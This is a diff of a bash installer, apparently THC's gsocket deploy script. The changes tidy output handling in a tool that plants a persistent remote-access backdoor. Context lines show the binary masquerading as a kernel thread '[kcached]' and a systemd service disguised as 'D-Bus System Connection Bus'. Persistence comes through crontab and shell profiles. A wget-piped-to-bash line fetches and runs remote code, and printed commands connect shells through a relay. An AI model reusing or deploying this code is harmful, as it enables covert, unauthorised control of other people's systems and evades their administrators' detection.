@@ -59,14 +59,16 @@ DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT=gs-dbus
 # Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
 PROC_HIDDEN_NAME_DEFAULT="[kcached]"
-CY="\033[1;33m" # yellow
-CG="\033[1;32m" # green
-CR="\033[1;31m" # red
-CDR="\033[0;31m" # red
-CC="\033[1;36m" # cyan
-CM="\033[1;35m" # magenta
-CN="\033[0m"    # none
-CW="\033[1;37m"
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CDR="\033[0;31m" # red
+	CC="\033[1;36m" # cyan
+	CM="\033[1;35m" # magenta
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+}
 
 # arr=()
 # arr+=("-r" "/etc/foobar.txt")
@@ -386,16 +388,9 @@ exit_code()
 
 errexit()
 {
-	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"
+	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
 
 	exit_code 255
-}
-
-# When all was successfull
-exit_alldone()
-{
-	echo 1>&1 "$*"
-	exit_code 0
 }
 
 # Test if directory can be used to store executeable
@@ -470,7 +465,7 @@ init_dstbin()
 	# Try /dev/shm as last resort
 	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
 
-	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
 	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
 	errexit
 }
@@ -747,7 +742,7 @@ uninstall_rm()
 	[[ -z "$1" ]] && return
 	[[ ! -f "$1" ]] && return # return if file does not exist
 
-	echo 1>&2 "Removing $1..."
+	echo "Removing $1..."
 	xrm "$1" 2>/dev/null || return
 }
 
@@ -758,7 +753,7 @@ uninstall_rmdir()
 
 	xrmdir "$1" 2>/dev/null || return
 
-	echo 1>&2 "Removing $1..."
+	echo "Removing $1..."
 }
 
 uninstall_rc()
@@ -774,7 +769,7 @@ uninstall_rc()
 
 	mk_file "$fn" || return
 
-	echo 1>&2 "Removing ${fn}..."
+	echo "Removing ${fn}..."
 	D="$(grep -v -F -- "${hname}" "$fn")"
 	echo "$D" >"${fn}" || return
 
@@ -853,40 +848,40 @@ uninstall()
 	# Remove systemd service
 	uninstall_service "${SERVICE_DIR}" "${SERVICE_HIDDEN_NAME}"
 	uninstall_service "/etc/systemd/system" "gs-bd" #OLD
-	systemctl daemon-reload 2>/dev/null
+	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
 
 	## Systemd's gs-dbus.dat
 	uninstall_rm "${SYSTEMD_SEC_FILE}"
 	uninstall_rm "/etc/systemd/system/gs-bd.dat" #OLD
 
-	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
+	echo -e "${CG}Uninstall complete.${CN}"
+	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
 	exit_code 0
 }
 
 SKIP_OUT()
 {
-	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	echo -e "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
 }
 
 OK_OUT()
 {
-	echo -e 1>&2 "......[${CG}OK${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	echo -e "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
 }
 
 FAIL_OUT()
 {
-	echo -e 1>&2 "..[${CR}FAILED${CN}]"
+	echo -e "..[${CR}FAILED${CN}]"
 	for str in "$@"; do
-		echo -e 1>&2 "--> $str"
+		echo -e "--> $str"
 	done
 }
 
 WARN()
 {
-	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
+	echo -e "--> ${CY}WARNING: ${CN}$*"
 }
 
 WARN_EXECFAIL_SET()
@@ -898,15 +893,15 @@ WARN_EXECFAIL_SET()
 WARN_EXECFAIL()
 {
 	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
-	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
-	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
+	echo -e "--> Please send this output to ${CC}root@proton.thc.org${CN} to get it fixed."
+	echo -e "--> ${WARN_EXECFAIL_MSG}"
 }
 
 HOWTO_CONNECT_OUT()
 {
 	# After all install attempts output help how to uninstall
-	echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
-	echo -e 1>&2 "--> To connect use one of the following:
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
@@ -958,6 +953,7 @@ install_system_systemd()
 
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
@@ -1026,7 +1022,7 @@ install_system_rclocal()
 
 install_system()
 {
-	echo -en 2>&1 "Installing systemwide remote access permanentally....................."
+	echo -en "Installing systemwide remote access permanentally....................."
 
 	# Try systemd first
 	install_system_systemd
@@ -1044,7 +1040,7 @@ install_system()
 install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
-	echo -en 2>&1 "Installing access via crontab........................................."
+	echo -en "Installing access via crontab........................................."
 	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -1079,7 +1075,7 @@ install_user_profile()
 	rc_filename_status="${rc_filename}................................"
 	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
 
-	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
+	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
 	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -1111,19 +1107,19 @@ install_user()
 ask_nocertcheck()
 {
 	WARN "Can not verify host. CA Bundle is not installed."
-	echo "--> Attempting without certificate verification."
-	echo "--> Press any key to continue or CTRL-C to abort..."
-	echo -en 1>&2 -en "--> Continuing in "
+	echo >&2 "--> Attempting without certificate verification."
+	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
+	echo -en >&2 "--> Continuing in "
 	local n
 
 	n=10
 	while :; do
-		echo -en 1>&2 "${n}.."
+		echo -en >&2 "${n}.."
 		n=$((n-1))
 		[[ $n -eq 0 ]] && break 
 		read -r -t1 -n1 && break
 	done
-	[[ $n -gt 0 ]] || echo 1>&2 "0"
+	[[ $n -gt 0 ]] || echo >&2 "0"
 
 	GS_NOCERTCHECK=1
 }
@@ -1143,7 +1139,7 @@ dl_ssl()
 	fi
 	[[ -z $GS_NOCERTCHECK ]] && return
 
-	echo -en 2>&1 "Downloading binaries without certificate verification................."
+	echo -en "Downloading binaries without certificate verification................."
 	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
 }
 
@@ -1194,7 +1190,7 @@ dl()
 # S= was set. Do not install but execute in place.
 gs_access()
 {
-	echo -e 2>&1 "Connecting..."
+	echo -e "Connecting..."
 	local ret
 	GS_SECRET="${S}"
 
@@ -1315,7 +1311,7 @@ test_network()
 try_network()
 {
 	DEBUGF "GS_SECRET2=${GS_SECRET}"
-	echo -en 2>&1 "Testing Global Socket Relay Network..................................."
+	echo -en "Testing Global Socket Relay Network..................................."
 	test_network
 	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
 		OK_OUT
@@ -1335,13 +1331,13 @@ try()
 	osarch="$1"
 
 	src_pkg="gs-netcat_${osarch}.tar.gz"
-	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
+	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
-	echo -en 2>&1 "Downloading binaries.................................................."
+	echo -en "Downloading binaries.................................................."
 	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
 	OK_OUT
 
-	echo -en 2>&1 "Unpacking binaries...................................................."
+	echo -en "Unpacking binaries...................................................."
 	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
 	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
 	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
@@ -1351,12 +1347,12 @@ try()
 	}
 	OK_OUT
 
-	echo -en 2>&1 "Copying binaries......................................................"
+	echo -en "Copying binaries......................................................"
 	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
-	echo -en 2>&1 "Testing binaries......................................................"
+	echo -en "Testing binaries......................................................"
 	test_bin "${DSTBIN}"
 	if [[ -n "$IS_TESTBIN_OK" ]]; then
 		OK_OUT
@@ -1438,8 +1434,8 @@ gs_start()
 			# HERE: sec.dat has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
-			echo -e 1>&2 "--> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
-			[[ -n $OLD_PIDS ]] && echo -e 1>&2 "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
+			echo -e "--> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -1500,7 +1496,7 @@ WARN_EXECFAIL
 # -----BEGIN Install permanentally-----
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
-		echo -en 2>&1 "Installing remote access.............................................."
+		echo -en "Installing remote access.............................................."
 		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
 	else
 		# Try to install system wide. This may also start the service.
@@ -1510,25 +1506,25 @@ if [[ -z $GS_NOINST ]]; then
 		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
 	fi
 else
-	echo -e 2>&1 "GS_NOINST is set. Skipping installation."
+	echo -e "GS_NOINST is set. Skipping installation."
 fi
 # -----END Install permanentally-----
 
 if [[ -z "$IS_INSTALLED" || -n $IS_DSTBIN_TMP ]]; then
-	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
+	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
 HOWTO_CONNECT_OUT
 
-printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
 	SKIP_OUT "GS_NOSTART=1 is set."
 else
 	gs_start
 fi
 
-echo -e 2>&2 "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
 exit_code 0
